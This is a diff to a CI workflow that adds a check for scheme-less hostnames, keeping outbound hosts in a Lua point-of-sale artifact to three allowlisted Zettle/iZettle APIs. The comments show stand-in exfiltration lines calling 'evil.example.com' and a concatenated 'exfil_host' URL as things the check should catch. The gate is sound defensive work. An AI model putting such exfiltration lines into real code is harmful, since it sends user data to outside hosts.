@@ -83,15 +83,41 @@ jobs:
       - name: Egress allowlist gate — only zettle/izettle hosts in artifact
         run: |
           set -e
+          # Primary check: scheme-prefixed URLs.
           BAD=$(grep -Eo 'https?://[^"'"'"' ]+' dist/paypal-pos.lua \
             | grep -v 'oauth\.zettle\.com\|purchase\.izettle\.com\|finance\.izettle\.com' \
             || true)
           if [ -n "$BAD" ]; then
-            echo "FAIL: unexpected hosts in dist/paypal-pos.lua:"
+            echo "FAIL: unexpected scheme-prefixed hosts in dist/paypal-pos.lua:"
             echo "$BAD"
             exit 1
           fi
-          echo "OK: only allowlisted hosts in dist/paypal-pos.lua"
+          # S-05 SEC: complementary TLD-pattern grep catches scheme-less
+          # hostnames (Connection():get("evil.example.com/path")) that the
+          # scheme-prefixed pattern above misses, and string-concatenated URLs
+          # (local url = "https://" .. exfil_host .. "/log") where the host
+          # token appears without a scheme prefix.
+          #
+          # The TLD list covers public TLDs most commonly used in exfiltration
+          # scenarios. The allowlist mirrors the scheme-prefixed allowlist
+          # exactly. Extend the TLD list if a real-world exfil channel surfaces.
+          # NOTE on false positives: dotted Lua i18n key namespaces
+          # (e.g. "account.purpose.net") incidentally end in TLD-shaped
+          # suffixes. We exclude any token whose first label appears to be a
+          # known Lua namespace prefix used by the project — extend this list
+          # only if a new prefix appears in src/. The allowlist also includes
+          # the three legitimate API hosts. The remaining set MUST be empty.
+          BAD_BARE=$(grep -Eo '\b([a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?\.)+(com|net|org|io|dev|app|cloud|sh|de|info|co|biz|me|xyz|tech)\b' dist/paypal-pos.lua \
+            | sort -u \
+            | grep -Ev '^(oauth\.zettle\.com|purchase\.izettle\.com|finance\.izettle\.com)$' \
+            | grep -Ev '^(account|transaction|credential|error|purpose|http|finance|mapping|auth|entry)\.' \
+            || true)
+          if [ -n "$BAD_BARE" ]; then
+            echo "FAIL: unexpected scheme-less hostnames in dist/paypal-pos.lua (S-05 SEC):"
+            echo "$BAD_BARE"
+            exit 1
+          fi
+          echo "OK: only allowlisted hosts in dist/paypal-pos.lua (scheme + scheme-less)"
 
       - name: No-AI-attribution gate
         run: |
